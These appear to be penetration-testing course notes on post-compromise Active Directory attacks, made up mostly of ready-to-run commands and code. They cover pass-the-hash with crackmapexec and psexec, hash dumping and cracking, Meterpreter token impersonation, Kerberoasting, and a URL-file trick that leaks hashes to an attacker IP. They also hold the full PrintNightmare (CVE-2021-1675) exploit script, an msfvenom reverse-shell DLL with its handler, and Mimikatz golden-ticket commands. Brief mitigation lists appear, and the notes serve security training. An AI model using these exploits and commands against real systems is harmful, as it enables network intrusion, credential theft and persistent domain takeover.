❗️ *post-compromise = must have credentials already or shell on the machine(s)*

# Pass the hash / Password
*heath does this first when obtaining creds*
If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

## crackmapexec
takes user name, domain, and password >> throws it around subnet >> see where it sticks
```bash
crackmapexec <ip/CIDR> -u <user> -d <domain> -p <pass>

#local, after obtaining local hash
crackmapexec <ip/CIDR> -u <user> -H <hash> --local
```

installing
```bash
apt install crackmapexec
crackmapexec #run
```

#### Pass the Password Attacks
```bash
crackmapexec --help #use and options
crackmapexec smb <IP>/24 -u fcastle -d MARVEL.local -p Password1 #anything Pwn3d! = acess 

# can try --sam to dump SAM hashes from Pwn3d
crackmapexec smb <IP>/24 -u fcastle -d MARVEL.local -p Password1 --sam
#can use secretsdump.py to get hashes


#can try psexec to get shell
psexec.py marvel/fcastle:Password@192.168.57.142
```

#### Dumping hashes with secretsdump.py
```bash
secretsdump.py marvel/fcastle:Password@192.168.57.142 #dump SAM hashes and LSA secrets (can use for mimikatz)

#copy and paste to txt twice >> compare to see if password reuse is in place
```

#### Cracking NTLM hashes with Hashcat
move hashes to hashcat folder
❗️ ntml hashes can be passed, ntlm v2 CAN NOT
```powershell
hashcat64.exe -m 1000 hashes4.txt rockyou.txt -o
```

#### Pass the Hash attacks
```bash
crackmapexec smb <IP>/24 -u fcastle -H <hash> --local-auth #any green or pwn3d = access

#can try psexec to get shell
psexec.py "frank castle":Password@192.168.57.141 -hashes <hash>
```

**Pass Attack Mitigations**
- hard to completely prevent, but can make more difficult on attacker
	- limit account re-use
		- avoid re-using local admin password
		- disable guest and admin accounts
		- limit who is a local admin (least priv)
	- utilize strong passwords
		- longer the better >14 characters
		- avoid using common words
		- i like long sentences
	- privilege access management (PAM)
		- check out/in sensitive accounts when neede
		- automatically rotate passwords on check out and check in
		- limits pass attacks as hash/password is strong and constantly rotated

# Token Impersonation
What are tokens?
- temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
Two types:
- delegate - created for logging into a machine or using remote desktop
- impersonate - "non-interactive" such as attacking a network drive or a domain logon script
1. pop a shell and load incognito
```bash 
#meterpreter
getuid
load incognito
list_tokens -u
```
2. impersonate our domain admin
```bash
#meterpreter
impersonate_token <domain admin token>
shell
whoami
```
3. attempt to dump hashes domain admin
```bash
Invoke-Mimikatz -Command '"privilege::debug" "LSADump:LSA /path" exit' -Computer HYDRA.marvel.local
```
goal is to navigate to a machine with a domain admin token you can impersonate and do the above

#### Token impersonation with Incognito
```bash
#get meterpreter session
msfconsole
use exploit/windows/smb/psexec
options
set rhosts <target IP>
set smbdomain mavel.local
set smbpass Password1
set smbuser fcastle
show targets
set target 2
options #check
set payload windows/x64/meterpreter/reverse_tcp
set lhost eth0
#run 
run

#in meterpreter windows session
hashdump
getuid
sysinfo
load # double tab >> show options of tools to load
load incognito
help #incognito commands
list_tokens -u
impersonate_token marvel\\administrator
shell

#use rev2self to switch back to you
```

Token Impersonation Mitigation Strategies
- limit user/group token creation permissions
- account tiering >> domain admin should ONLY be logging into domain controllers
- local admin restriction

# Kerberoasting Overview
**Kerberos**:
1. DC = the key distribution center (KDS)
2. user = needs to authenticate to DC >> request the ticket granting ticket (TGT)
3. DC sends TGT and encrypts with TGT hash
4. user then requests ticket granting service (TGS) for the server/app
5. DC send TGS encrypted with server account hash
6. user presents TGS for service/app
7. app server says yes or no

❗️ Goal of kerberoasting = get TGS and decrypt server's account hash
1. Get SPNs, dump hash
```bash
python GetUserSPNs.py <domain/username:password> -dc-ip <IP of DC> -request
```
2. copy hash and try to crack it
```bash
hashcat64.exe -m 13100 kerberoast.txt rockyou.txt -O
```

Walkthrough:
```bash
GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
#copy and save hash output
#will use hashcat
hashcat --help | grep Kerberos #will use 13100
hashcat64.exe -m 13100 kerberoast.txt rockyou.txt -O
#will prsent credentials
```

Kerberoasting mitigation:
- strong passwords
- least privilege - do NOT make service accounts domain administrators

# GPP / cPassword Attacks Overview
Old, but still relevant >> MS14-025
Group Policy Pwnage: [https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

**Overview**:
- group policy preferences allowed admins to create policies using embedded credentials
- these credentials were encrypted and placed in a "cPassword"
  the key was accidentally released
- patched in MS14-025, but doesn't prevent previous uses

❗️ `smb_enum_gpp` >> metasploit module, always check for gpp

### Active - Hackthebox
- exploiting gpp
- writeup: https://shishirsubedi.com.np/htb/active/
once gpp cracked >> can use for kerberoasting

# URL File Attacks
Active Directory Attacks - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

We can dump quick file and cause hashes to load:
```html
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\\x.x.x.x\%USERNAME%.icon <!-- attacker IP, to point hashes back to us -->
IconIndex=1
```

*These attacks require compromised user account or exposed file share*

# PrintNightmare CVE-2021-1675
*need compromised account*
Takes advantage of printer spooler, Attacks:
- cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675) 
	- what we use for this course
- calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)
Mitigation = disable print spooler service

Install
```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
Save code into file >> CVE-2021-1675.py
```python
#!/usr/bin/python3
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.structure import Structure
import argparse
import sys
import pathlib

#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
class DRIVER_INFO_2_BLOB(Structure):
    structure = (
        ('cVersion','<L'),
        ('NameOffset', '<L'),
        ('EnvironmentOffset', '<L'),
        ('DriverPathOffset', '<L'),
        ('DataFileOffset', '<L'),
        ('ConfigFileOffset', '<L'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)
    
    def fromString(self, data, offset=0):
        Structure.fromString(self, data)
        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']+offset:self['DataFileOffset']+offset].decode('utf-16-le')
        self['DataFileArray'] = self.rawData[self['DataFileOffset']+offset:self['DriverPathOffset']+offset].decode('utf-16-le')
        self['DriverPathArray'] = self.rawData[self['DriverPathOffset']+offset:self['EnvironmentOffset']+offset].decode('utf-16-le')
        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']+offset:self['NameOffset']+offset].decode('utf-16-le')
        #self['NameArray'] = self.rawData[self['NameOffset']+offset:len(self.rawData)].decode('utf-16-le')

class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data = None, pcReturned = None):
        Structure.__init__(self, data = data)
        self['drivers'] = list()
        remaining = data
        if data is not None:
            for i in range(pcReturned):
                attr = DRIVER_INFO_2_BLOB(remaining)
                self['drivers'].append(attr)
                remaining = remaining[len(attr):]

def connect(username, password, domain, lmhash, nthash, address, port):
    binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
    rpctransport = transport.DCERPCTransportFactory(binding)
    
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(address)
    
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    
    print("[*] Connecting to {0}".format(binding))
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except:
        print("[-] Connection Failed")
        sys.exit(1)
    print("[+] Bind OK")
    return dce


def getDriver(dce, handle=NULL):
    #get drivers
    resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
    blobs = DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])
    for i in blobs['drivers']:
        if "filerepository" in i['DriverPathArray'].lower():
            return i
    
    print("[-] Failed to find driver")
    sys.exit(1)


def main(dce, pDriverPath, share, handle=NULL):
    #build DRIVER_CONTAINER package
    container_info = rprn.DRIVER_CONTAINER()
    container_info['Level'] = 2
    container_info['DriverInfo']['tag'] = 2
    container_info['DriverInfo']['Level2']['cVersion']     = 3
    container_info['DriverInfo']['Level2']['pName']        = "1234\x00"
    container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
    container_info['DriverInfo']['Level2']['pDriverPath']  = pDriverPath + '\x00'
    container_info['DriverInfo']['Level2']['pDataFile']    = "{0}\x00".format(share)
    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
    
    flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
    filename = share.split("\\")[-1]

    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
    print("[*] Stage0: {0}".format(resp['ErrorCode']))

    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"
    for i in range(1, 30):
        try:
            container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
            resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
            print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
            if (resp['ErrorCode'] == 0):
                print("[+] Exploit Completed")
                sys.exit()
        except Exception as e:
            #print(e)
            pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = True, description = "MS-RPRN PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.",formatter_class=argparse.RawDescriptionHelpFormatter,epilog="""
Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'
    """)
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('share', action='store', help='Path to DLL. Example \'\\\\10.10.10.10\\share\\evil.dll\'')
    parser.add_argument('pDriverPath', action='store', help='Driver path. Example \'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\'', nargs="?")
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group = parser.add_argument_group('connection')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    #connect
    dce = connect(username, password, domain, lmhash, nthash, options.target_ip, options.port)
    #handle = "\\\\{0}\x00".format(address)
    handle = NULL

    #find "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL" path
    if not options.pDriverPath:
        try:
            blob = getDriver(dce, handle)
            pDriverPath = str(pathlib.PureWindowsPath(blob['DriverPathArray']).parent) + '\\UNIDRV.DLL'
            if not "FileRepository" in pDriverPath:
                print("[-] pDriverPath {0}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....".format(pDriverPath))
                print("[-] Specify pDriverPath manually")
                sys.exit(1)
        except Exception as e:
            print('[-] Failed to enumerate remote pDriverPath')
            print(str(e))
            sys.exit(1)
    else:
        pDriverPath = options.pDriverPath

    if "\\\\" in options.share:
        options.share = options.share.replace("\\\\","\\??\\UNC\\")

    print("[+] pDriverPath Found {0}".format(pDriverPath))
    print("[*] Executing {0}".format(options.share))

    #re-run if stage0/stageX fails
    print("[*] Try 1...")
    main(dce, pDriverPath, options.share)
    print("[*] Try 2...")
    main(dce, pDriverPath, options.share)
    print("[*] Try 3...")
    main(dce, pDriverPath, options.share)
```

Use msfvenom to generate payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=5555 -f dll >shell.dll

#new msfconsole tab
msfconsole
use multi/handler
options #need to set payload
set payload windows/x64/meterpreter/reverse_tcp
set lport 5555
set lhost <attacker ip>
run
```
new tab >> set up file share to share file we created
```bash
smbserver.py share `pwd` -smb2support #run with smb support
```
we need user pass and DC
```bash
#back in msfvenom tab
python3 CVE-2021-1675.py marvel.local/fcastle:Password1@<DC IP> `\\<our kali file share>\share\shell.dll
```

# Mimikatz Overview
**What is Mimikats?**
- tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
- dumps credentials stored in memory
- just a few attacks: credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket

❗️ Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
Place in DC
we assume a compromised DC >> what we can do after and why
### Credential dumping with mimikatz
run mimikatz in DC
```powershell
cd Downloads
mimikatz.exe
#>>>>first thing to always do
privilege::debug #look for privilege 20 OK

sekurlsa::logonpasswords #shows recent login users, can search admins , can turn out wdigest with mimikatz 

lsadump::sam #try to dump SAM
lsadump::sam /patch

lsadump::lsa /patch #usernames and NTML hashes >> can crack hashes offline
```

### Golden Ticket Attacks
- golden tickets establish persistence
```powershell
cd Downloads
mimikatz.exe
#>>>>first thing to always do
privilege::debug #look for privilege 20 OK

lsadump::lsa /inject /name:krbtgt #pull down the TGT account
#copy and save SID of domain, NTLM of TGT account

#generate golden ticket then pass the ticket
kerberos::golden /User:Administrator /domain:marvel.local /sid:<SID number> /krbtgt:<tgt acc hash> /id:500 /ptt #user can be anything

#from here can use psexec to get shells
``` 

# Additional AD Resources
- Active Directory Security Blog: [https://adsecurity.org/](https://adsecurity.org/)
- Harmj0y Blog: [http://blog.harmj0y.net/](http://blog.harmj0y.net/)
- Pentester Academy Active Directory: [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab
- Pentester Academy Red Team Labs: [https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)
- eLS PTX: [https://elearnsecurity.com/product/ecptx-certification/](https://elearnsecurity.com/product/ecptx-certification/)

